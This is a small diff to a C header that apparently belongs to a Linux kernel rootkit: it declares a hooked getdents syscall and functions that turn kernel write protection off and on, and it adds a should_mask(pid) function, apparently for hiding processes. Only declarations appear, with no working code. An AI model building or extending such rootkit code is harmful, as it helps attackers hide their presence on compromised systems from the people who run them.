@@ -38,6 +38,7 @@ asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, u
 unsigned long get_inode_no(char *path_name);
 void disable_write_protect_mode(void);
 void enable_write_protect_mode(void);
+int should_mask(pid_t pid);
 
 
 #endif
